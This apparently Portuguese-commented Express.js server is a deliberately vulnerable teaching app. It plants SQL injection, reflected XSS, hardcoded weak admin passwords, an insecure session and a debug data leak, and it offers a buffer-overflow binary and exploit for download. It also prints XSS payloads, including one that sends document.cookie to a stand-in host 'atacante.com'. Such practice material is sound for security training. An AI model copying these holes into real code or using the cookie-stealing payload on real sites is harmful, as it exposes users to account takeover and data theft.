const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const session = require('express-session');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(session({
    secret: 'weak-secret-key', // Vulnerabilidade: chave fraca
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Vulnerabilidade: cookie não seguro
}));

// Inicializar banco de dados SQLite
const db = new sqlite3.Database('./database.db');

// Criar tabelas se não existirem
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT DEFAULT 'user'
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        title TEXT,
        content TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )`);

    // Inserir usuários padrão com senhas fracas (vulnerabilidade)
    db.run(`INSERT OR IGNORE INTO users (username, password, role) VALUES 
        ('admin', 'admin123', 'admin'),
        ('user1', 'password', 'user'),
        ('guest', '123456', 'user')`);

    // Inserir algumas mensagens de exemplo
    db.run(`INSERT OR IGNORE INTO messages (id, user_id, title, content, created_at) VALUES 
        (1, 1, 'Welcome', 'Seja bem vindo', '2024-12-03 00:00:00')`);
});

// Rotas
app.get('/', (req, res) => {
    if (req.session.user) {
        if (req.session.user.role === 'admin') {
            res.redirect('/dashboard');
        } else {
            res.redirect('/messages');
        }
    } else {
        res.sendFile(path.join(__dirname, 'public', 'login.html'));
    }
});

// Login - VULNERÁVEL A SQL INJECTION
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Vulnerabilidade: SQL Injection - consulta não preparada
    const checkuser = `SELECT * FROM users WHERE username = '${username}'`;
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

    db.get(checkuser, (err, user) => {
        if (err) {
            console.error('Database error:', err);
            res.status(500).send('Erro interno do servidor');
            return;
        }

        if (user) {
            db.get(query, (err, user) => {
                if (err) {
                    console.error('Database error:', err);
                    res.status(500).send('Erro interno do servidor');
                    return;
                }

                if (user) {
                    req.session.user = user;
                    if (user.role === 'admin') {
                        res.redirect('/dashboard');
                    } else {
                        res.redirect('/messages');
                    }
                } else {
                    res.send('<script>alert("Senha incorreta."); window.location="/";</script>');
                }
            });
        } else {
            res.send('<script>alert("Usuário não cadastrado."); window.location="/";</script>');
        }
    });
});

// Dashboard do Admin - controle de acesso fraco
app.get('/dashboard', (req, res) => {
    // Vulnerabilidade: verificação fraca de autorização
    if (!req.session.user || req.session.user.role !== 'admin') {
        res.redirect('/');
        return;
    }
    
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API para obter todos os usuários (apenas admin)
app.get('/api/users', (req, res) => {
    // Vulnerabilidade: sem verificação adequada de permissões
    if (!req.session.user || req.session.user.role !== 'admin') {
        res.status(403).json({ error: 'Acesso negado' });
        return;
    }
    
    db.all('SELECT id, username, role FROM users', (err, users) => {
        if (err) {
            res.status(500).json({ error: 'Erro no banco de dados' });
            return;
        }
        res.json(users);
    });
});

// Página de mensagens para usuários
app.get('/messages', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
    }
    else if (req.session.user.role === 'admin') {
        res.sendFile(path.join(__dirname, 'public', 'admin-messages.html'));
    }
    else {
        res.sendFile(path.join(__dirname, 'public', 'messages.html'));
    }
});

// API para obter mensagens do usuário
app.get('/api/messages', (req, res) => {
    if (!req.session.user) {
        res.status(401).json({ error: 'Não autenticado' });
        return;
    }
    
    const userId = req.session.user.id;
    
    // Vulnerabilidade: possível acesso a mensagens de outros usuários
    const query = `SELECT * FROM messages`;

    //sanitizaQuery(query)
    
    db.all(query, (err, messages) => {
        if (err) {
            res.status(500).json({ error: 'Erro no banco de dados' });
            return;
        }
        res.json(messages);
    });
});

// Rota para criar nova mensagem - VULNERÁVEL A XSS REFLECTED
app.post('/create-message', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    const { title, content } = req.body;
    const userId = req.session.user.id;
    
    if (!title || !content) {
        // Vulnerabilidade XSS Reflected: dados não sanitizados refletidos na resposta
        res.send(`
            <html>
                <head>
                    <title>Erro - Mensagem</title>
                    <link rel="stylesheet" href="/style.css">
                </head>
                <body>
                    <div class="container">
                        <div class="error-message">
                            <h2>⚠️ Erro ao criar mensagem</h2>
                            <p>Título informado: <strong>${title || 'Não informado'}</strong></p>
                            <p>Conteúdo informado: <strong>${content || 'Não informado'}</strong></p>
                            <p>Todos os campos são obrigatórios!</p>
                            <a href="/messages">← Voltar às mensagens</a>
                        </div>
                    </div>
                </body>
            </html>
        `);
        return;
    }
    
    // Inserir mensagem no banco (também vulnerável a SQL injection)
    const query = `INSERT INTO messages (user_id, title, content) VALUES (${userId}, '${title}', '${content}')`;
    
    db.run(query, function(err) {
        if (err) {
            console.error('Erro ao inserir mensagem:', err);
            res.send(`
                <html>
                    <head>
                        <title>Erro - Banco de Dados</title>
                        <link rel="stylesheet" href="/style.css">
                    </head>
                    <body>
                        <div class="container">
                            <div class="error-message">
                                <h2>💥 Erro no banco de dados</h2>
                                <p>Título: <strong>${title}</strong></p>
                                <p>Erro: ${err.message}</p>
                                <a href="/messages">← Voltar às mensagens</a>
                            </div>
                        </div>
                    </body>
                </html>
            `);
            return;
        }
        
        // Sucesso - também vulnerável a XSS reflected
        res.send(`
            <html>
                <head>
                    <title>Mensagem Criada</title>
                    <link rel="stylesheet" href="/style.css">
                </head>
                <body>
                    <div class="container">
                        <div class="success-message">
                            <h2>✅ Mensagem criada com sucesso!</h2>
                            <p>Título: <strong>${title}</strong></p>
                            <p>Conteúdo: <strong>${content}</strong></p>
                            <p>ID da mensagem: ${this.lastID}</p>
                            <a href="/messages">← Voltar às mensagens</a>
                        </div>
                    </div>
                </body>
            </html>
        `);
    });
});

// Rota para visualizar mensagem específica - VULNERÁVEL A XSS REFLECTED
app.get('/view-message', (req, res) => {
    if (!req.session.user) {
        res.redirect('/');
        return;
    }
    
    const { search, highlight } = req.query;
    
    // Vulnerabilidade XSS Reflected: parâmetros de query refletidos sem sanitização
    res.send(`
        <html>
            <head>
                <title>Buscar Mensagens</title>
                <link rel="stylesheet" href="/style.css">
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔍 Buscar Mensagens</h1>
                        <a href="/messages">← Voltar às mensagens</a>
                    </div>
                    
                    <div class="search-form">
                        <h3>Buscar por termo:</h3>
                        <form method="GET" action="/view-message">
                            <input type="text" name="search" placeholder="Digite o termo de busca" value="${search || ''}" />
                            <input type="text" name="highlight" placeholder="Termo para destacar" value="${highlight || ''}" />
                            <button type="submit">🔍 Buscar</button>
                        </form>
                    </div>
                    
                    ${search ? `
                        <div class="search-results">
                            <h3>📋 Resultados da busca</h3>
                            <p>Você pesquisou por: <strong>${search}</strong></p>
                            ${highlight ? `<p>Destacando: <em>${highlight}</em></p>` : ''}
                            <div class="vulnerability-demo">
                                <h4>🎯 Demonstração de XSS Reflected</h4>
                                <p>Termo pesquisado será executado: ${search}</p>
                                ${highlight ? `<p>Destaque aplicado: ${highlight}</p>` : ''}
                            </div>
                        </div>
                    ` : ''}
                    
                    <div class="vulnerability-info">
                        <h3>🔥 Como explorar esta vulnerabilidade:</h3>
                        <ol>
                            <li>Digite um payload XSS no campo de busca: <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></li>
                            <li>Use o campo highlight para executar JavaScript: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></li>
                            <li>Para vazar o cookie do admin, use: <code>&lt;script&gt;document.location='http://atacante.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></li>
                        </ol>
                        
                        <div class="cookie-info">
                            <h4>🍪 Cookie atual (para demonstração):</h4>
                            <script>document.write('Cookie: ' + document.cookie);</script>
                        </div>
                    </div>
                </div>
            </body>
        </html>
    `);
});

// Página de exemplos de XSS
app.get('/xss-examples', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'xss_examples.html'));
});

// Logout
app.post('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// Rota para visualizar informações da sessão (vulnerabilidade de debug)
app.get('/debug', (req, res) => {
    res.json({
        session: req.session,
        headers: req.headers,
        ip: req.ip
    });
});

// Rota para executar ferramenta administrativa em C (vulnerável a buffer overflow)
app.post('/admin-tool', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        res.status(403).json({ error: 'Acesso negado - apenas administradores' });
        return;
    }
    
    const { comando } = req.body;
    
    if (!comando) {
        res.status(400).json({ error: 'Comando não fornecido' });
        return;
    }
    
    // Vulnerabilidade: execução de comando sem sanitização adequada
    const adminTool = spawn('./admin_tool', [comando], {
        timeout: 5000,
        cwd: __dirname
    });
    
    let output = '';
    let error = '';
    
    adminTool.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    adminTool.stderr.on('data', (data) => {
        error += data.toString();
    });
    
    adminTool.on('close', (code) => {
        res.json({
            comando: comando,
            output: output,
            error: error,
            exitCode: code
        });
    });
    
    adminTool.on('error', (err) => {
        res.status(500).json({
            error: 'Erro ao executar ferramenta administrativa',
            details: err.message
        });
    });
});

// Rota para listar binários disponíveis - VULNERABILIDADE: Exposição de binários
app.get('/binary', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Centro de Download de Binários</title>
                <link rel="stylesheet" href="/style.css">
                <style>
                    .binary-info {
                        background: white;
                        padding: 25px;
                        border-radius: 10px;
                        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                        margin-bottom: 25px;
                    }
                    .download-btn {
                        background: linear-gradient(135deg, #e74c3c, #c0392b);
                        color: white;
                        padding: 12px 25px;
                        text-decoration: none;
                        border-radius: 5px;
                        display: inline-block;
                        margin: 10px 5px;
                        transition: transform 0.2s;
                    }
                    .download-btn:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
                    }
                    .binary-details {
                        background: #f8f9fa;
                        border: 1px solid #dee2e6;
                        padding: 15px;
                        border-radius: 5px;
                        margin: 15px 0;
                        font-family: monospace;
                        font-size: 14px;
                    }
                    .warning-box {
                        background: #fff3cd;
                        border: 2px solid #ffeaa7;
                        color: #856404;
                        padding: 15px;
                        border-radius: 5px;
                        margin: 15px 0;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔧 Centro de Download de Binários</h1>
                        <a href="/dashboard">← Voltar ao Dashboard</a>
                    </div>
                    
                    <div class="warning-box">
                        <h3>⚠️ AVISO DE SEGURANÇA</h3>
                        <p>Esta página expõe binários executáveis para download. Em um ambiente real, 
                        isso seria uma <strong>vulnerabilidade crítica</strong> que permite:</p>
                        <ul>
                            <li>Download de executáveis para análise offline</li>
                            <li>Engenharia reversa do código</li>
                            <li>Descoberta de vulnerabilidades (como buffer overflow)</li>
                            <li>Desenvolvimento de exploits específicos</li>
                        </ul>
                    </div>
                    
                    <div class="binary-info">
                        <h3>📁 admin_tool - Ferramenta Administrativa</h3>
                        <p><strong>Descrição:</strong> Ferramenta administrativa compilada em C com vulnerabilidades intencionais</p>
                        
                        <div class="binary-details">
                            <strong>Informações Técnicas:</strong><br>
                            • Arquivo: admin_tool (ELF 64-bit)<br>
                            • Linguagem: C<br>
                            • Vulnerabilidades: Buffer Overflow, Format String<br>
                            • Função alvo: acessar_shell()<br>
                            • Compilado sem proteções (ASLR desabilitado)<br>
                            • Stack executable para facilitar exploração
                        </div>
                        
                        <div class="download-section">
                            <h4>📥 Downloads Disponíveis:</h4>
                            <a href="/binary/admin_tool" class="download-btn">
                                📦 Baixar admin_tool (Binário)
                            </a>
                            <a href="/binary/admin_tool.c" class="download-btn">
                                📄 Baixar admin_tool.c (Código Fonte)
                            </a>
                            <a href="/binary/exploit_generator.py" class="download-btn">
                                🐍 Baixar exploit_generator.py (Exploit)
                            </a>
                        </div>
                        
                        <div class="analysis-info">
                            <h4>🔍 Análise Recomendada:</h4>
                            <ul>
                                <li><strong>file admin_tool</strong> - Identificar tipo de arquivo</li>
                                <li><strong>checksec admin_tool</strong> - Verificar proteções de segurança</li>
                                <li><strong>objdump -d admin_tool</strong> - Disassembly completo</li>
                                <li><strong>gdb admin_tool</strong> - Debug dinâmico</li>
                                <li><strong>radare2 admin_tool</strong> - Análise avançada</li>
                            </ul>
                        </div>
                        
                        <div class="exploitation-hints">
                            <h4>💣 Dicas para Exploração:</h4>
                            <ul>
                                <li>Procure pela função <code>acessar_shell()</code> no binário</li>
                                <li>Identifique o offset para sobrescrever o return address</li>
                                <li>Use ROP chains se necessário</li>
                                <li>Teste payloads através do endpoint <code>/admin-tool</code></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </body>
        </html>
    `);
});

// Rota para download do binário admin_tool
app.get('/binary/admin_tool', (req, res) => {
    const filePath = path.join(__dirname, 'admin_tool');
    
    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
        return res.status(404).send(`
            <html>
                <body>
                    <h1>Arquivo não encontrado</h1>
                    <p>O binário admin_tool não foi encontrado.</p>
                    <p>Execute 'make' para compilar o binário.</p>
                    <a href="/binary">← Voltar</a>
                </body>
            </html>
        `);
    }
    
    // Definir headers para download
    res.setHeader('Content-Disposition', 'attachment; filename="admin_tool"');
    res.setHeader('Content-Type', 'application/octet-stream');
    
    // Enviar o arquivo
    res.sendFile(filePath);
});

// Rota para download do código fonte
app.get('/binary/admin_tool.c', (req, res) => {
    const filePath = path.join(__dirname, 'admin_tool.c');
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('Código fonte não encontrado');
    }
    
    res.setHeader('Content-Disposition', 'attachment; filename="admin_tool.c"');
    res.setHeader('Content-Type', 'text/plain');
    res.sendFile(filePath);
});

// Rota para download do exploit generator
app.get('/binary/exploit_generator.py', (req, res) => {
    const filePath = path.join(__dirname, 'exploit_generator.py');
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('Exploit generator não encontrado');
    }
    
    res.setHeader('Content-Disposition', 'attachment; filename="exploit_generator.py"');
    res.setHeader('Content-Type', 'text/plain');
    res.sendFile(filePath);
});

// Rota para README do diretório binary
app.get('/binary/README.md', (req, res) => {
    const filePath = path.join(__dirname, 'binary', 'README.md');
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).send('README não encontrado');
    }
    
    res.setHeader('Content-Type', 'text/plain');
    res.sendFile(filePath);
});

// Rota para informações técnicas do binário (análise estática básica)
app.get('/binary/info', (req, res) => {
    const filePath = path.join(__dirname, 'admin_tool');
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'Binário não encontrado' });
    }
    
    // Executar comandos de análise básica
    const fileCommand = spawn('file', [filePath]);
    const sizeCommand = spawn('stat', ['-c', '%s', filePath]);
    
    let fileInfo = '';
    let sizeInfo = '';
    
    fileCommand.stdout.on('data', (data) => {
        fileInfo += data.toString();
    });
    
    sizeCommand.stdout.on('data', (data) => {
        sizeInfo += data.toString();
    });
    
    fileCommand.on('close', () => {
        sizeCommand.on('close', () => {
            const stats = fs.statSync(filePath);
            
            res.json({
                filename: 'admin_tool',
                path: '/binary/admin_tool',
                size: parseInt(sizeInfo.trim()),
                type: fileInfo.trim(),
                created: stats.birthtime,
                modified: stats.mtime,
                vulnerabilities: [
                    'Buffer Overflow',
                    'Format String',
                    'No ASLR',
                    'No Stack Canaries',
                    'Executable Stack'
                ],
                target_functions: [
                    'acessar_shell()',
                    'vulneravel_funcao()',
                    'main()'
                ],
                analysis_tools: [
                    'gdb',
                    'radare2', 
                    'objdump',
                    'checksec',
                    'readelf'
                ]
            });
        });
    });
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log('ATENÇÃO: Esta é uma aplicação PROPOSITALMENTE VULNERÁVEL para fins educativos!');
});